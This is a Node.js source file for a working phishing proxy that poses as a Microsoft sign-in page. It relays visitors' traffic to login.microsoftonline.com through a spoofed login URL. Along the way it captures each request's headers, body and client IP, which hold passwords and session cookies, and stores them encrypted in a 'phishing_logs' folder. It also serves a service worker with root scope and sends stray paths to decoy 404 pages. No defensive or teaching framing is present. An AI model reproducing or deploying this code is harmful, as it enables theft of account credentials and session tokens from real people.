const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Configuration
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const REDIRECT_URL = "https://www.microsoft.com";
const ENCRYPTION_KEY = "Yy+DWj+4bf/kqkg9eaqeQpvVBFZzrHKcJIKGYivp4wI=";
const PROXY_TARGET = "https://login.microsoftonline.com";
const PHISHING_PORT = 3000;

// Create logs directory
const LOGS_DIR = path.join(__dirname, 'phishing_logs');
if (!fs.existsSync(LOGS_DIR)) {
    fs.mkdirSync(LOGS_DIR);
}

// Encryption function
function encryptData(data) {
    return new Promise((resolve, reject) => {
        try {
            const iv = crypto.randomBytes(16);
            const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'utf8'), iv);
            let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
            encrypted += cipher.final('hex');
            resolve({
                iv: iv.toString('hex'),
                encryptedData: encrypted
            });
        } catch (error) {
            reject(error);
        }
    });
}

// Logging function
function logHTTPProxyTransaction(req, targetUrl, requestBody, responseStatus) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        method: req.method,
        url: req.url,
        targetUrl: targetUrl,
        headers: req.headers,
        requestBody: requestBody,
        responseStatus: responseStatus,
        ip: req.socket.remoteAddress
    };

    const logFileName = path.join(LOGS_DIR, `${new URL(targetUrl).hostname}__${new Date().toISOString().replace(/:/g, '-')}.log`);
    
    encryptData(logEntry).then(encrypted => {
        fs.writeFileSync(logFileName, JSON.stringify(encrypted, null, 2));
    }).catch(err => {
        console.error('Log encryption failed:', err.message);
    });
}

// Create server
const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;

  // ===== ROOT PATH - SERVE INDEX HTML FIRST =====
  if (pathname === '/') {
    const filePath = path.join(__dirname, 'index_smGQUDpT7PN.html');
    fs.readFile(filePath, (err, data) => {
      if (err) {
        console.error('Index file not found');
        res.writeHead(302, { 'Location': '/404_not_found_lk48ZVr32WU.html' });
        res.end();
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    });
    return;
  }

  // 1. SERVE SERVICE WORKER DIRECTLY (BYPASS PROXY)
  if (pathname === '/worker.js') {
    const filePath = path.join(__dirname, 'worker.js');
    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404);
        res.end('Service worker not found');
        return;
      }
      res.writeHead(200, {
        'Content-Type': 'application/javascript',
        'Service-Worker-Allowed': '/'
      });
      res.end(data);
    });
    return;
  }

  // 2. SERVE STATIC HTML FILES
  if (pathname === '/index_smGQUDpT7PN.html') {
    const filePath = path.join(__dirname, 'index_smGQUDpT7PN.html');
    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404);
        res.end('File not found');
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    });
    return;
  }

  if (pathname === '/404_not_found_lk48ZVr32WU.html') {
    const filePath = path.join(__dirname, '404_not_found_lk48ZVr32WU.html');
    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404);
        res.end('File not found');
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    });
    return;
  }

  // 3. HANDLE REDIRECT PAGES
  if (pathname === '/redirect.html' || pathname === '/microsoft.html') {
    const redirectUrl = `${PROXY_ENTRY_POINT}&${PHISHED_URL_PARAMETER}=${encodeURIComponent(PROXY_TARGET)}`;
    res.writeHead(302, { 'Location': redirectUrl });
    res.end();
    return;
  }

  // 4. HANDLE LOGIN PROXY
  if (pathname === '/login' && parsedUrl.query[PHISHED_URL_PARAMETER]) {
    const targetUrl = decodeURIComponent(parsedUrl.query[PHISHED_URL_PARAMETER]);
    
    let body = [];
    req.on('data', chunk => body.push(chunk));
    req.on('end', () => {
      body = Buffer.concat(body).toString();
      
      // Log the transaction
      logHTTPProxyTransaction(req, targetUrl, body, null);
      
      // Forward request to target
      const options = url.parse(targetUrl);
      options.method = req.method;
      options.headers = req.headers;
      options.headers.host = options.host;
      
      const proxyReq = https.request(options, (proxyRes) => {
        // Update log with response status
        logHTTPProxyTransaction(req, targetUrl, body, proxyRes.statusCode);
        
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res);
      });
      
      proxyReq.on('error', (e) => {
        console.error('Proxy error:', e.message);
        res.writeHead(502);
        res.end('Bad Gateway');
      });
      
      if (body) proxyReq.write(body);
      proxyReq.end();
    });
    return;
  }

  // 5. DEFAULT: REDIRECT TO 404
  res.writeHead(302, { 'Location': '/404_not_found_lk48ZVr32WU.html' });
  res.end();
});
